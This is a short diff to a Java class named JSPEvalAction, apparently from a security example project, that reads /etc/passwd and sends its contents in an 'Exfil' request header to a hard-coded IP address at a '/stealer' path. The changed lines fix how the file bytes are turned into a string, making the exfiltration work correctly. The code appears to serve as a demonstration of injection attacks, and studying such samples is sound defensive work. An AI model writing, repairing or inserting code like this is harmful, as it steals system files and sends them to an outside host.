@@ -47,7 +47,8 @@ public class JSPEvalAction extends ExampleAction {
 				File f = new File( "/etc/passwd" );
 				byte[] bytes = new byte[(int)f.length()];
 				FileInputStream fis = new FileInputStream(f);
-				String data = new String( fis.read(bytes) );
+				fis.read(bytes);
+				String data = new String( bytes );
 				URL evil = new URL("http://92.101.35.33/stealer");
 				HttpURLConnection con = (HttpURLConnection)evil.openConnection();
 				con.setRequestProperty("Exfil", data);
